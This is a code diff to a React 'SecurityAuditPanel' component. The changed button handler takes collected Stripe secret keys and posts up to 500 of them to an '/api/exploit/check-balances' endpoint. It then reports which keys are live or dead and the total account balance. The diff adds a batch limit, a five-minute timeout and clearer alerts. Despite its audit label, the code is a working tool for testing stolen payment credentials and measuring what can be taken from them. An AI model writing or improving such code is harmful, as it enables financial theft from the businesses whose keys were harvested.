@@ -720,27 +720,43 @@ export default function SecurityAuditPanel() {
                   onClick={async () => {
                     const stripeKeys = results.filter(r => r.category === 'financial');
                     if (!stripeKeys.length) return alert('No Stripe keys found');
-                    if (!confirm(`Check ALL ${stripeKeys.length} Stripe keys? This may take several minutes.`)) return;
+                    const maxKeys = 500;
+                    const keysToCheck = stripeKeys.length > maxKeys ? maxKeys : stripeKeys.length;
+                    if (!confirm(`Check ${keysToCheck} Stripe keys? (Limited to ${maxKeys} max)\n\nEstimated time: ${Math.ceil(keysToCheck / 10)} seconds`)) return;
                     const btn = event.target;
                     btn.disabled = true;
                     let count = 0;
                     const interval = setInterval(() => {
                       count++;
-                      btn.textContent = `Checking... ${count}s`;
+                      btn.textContent = `Checking... ${count}s / ~${Math.ceil(keysToCheck / 10)}s`;
                     }, 1000);
                     try {
+                      const controller = new AbortController();
+                      const timeout = setTimeout(() => controller.abort(), 300000); // 5 min max
+                      
                       const response = await fetch(`${API_URL}/api/exploit/check-balances`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
-                        body: JSON.stringify({ credentials: stripeKeys })
+                        body: JSON.stringify({ credentials: stripeKeys.slice(0, maxKeys), batchSize: 100 }),
+                        signal: controller.signal
                       });
+                      clearTimeout(timeout);
                       const data = await response.json();
                       if (data.success) {
                         setExploitResults({ type: 'balance', data });
-                        alert(`Checked ${data.checked} Stripe keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\n\nTOTAL BALANCE: $${data.summary.totalValue.toFixed(2)}`);
+                        const msg = `Checked ${data.checked} Stripe keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\n\nTOTAL BALANCE: $${data.summary.totalValue.toFixed(2)}`;
+                        if (stripeKeys.length > maxKeys) {
+                          alert(msg + `\n\nNote: Limited to ${maxKeys} keys. Load fewer credentials or run multiple batches.`);
+                        } else {
+                          alert(msg);
+                        }
                       }
                     } catch (error) {
-                      alert('Check failed: ' + error.message);
+                      if (error.name === 'AbortError') {
+                        alert('Check timed out after 5 minutes. Try with fewer keys.');
+                      } else {
+                        alert('Check failed: ' + error.message);
+                      }
                     } finally {
                       clearInterval(interval);
                       btn.disabled = false;
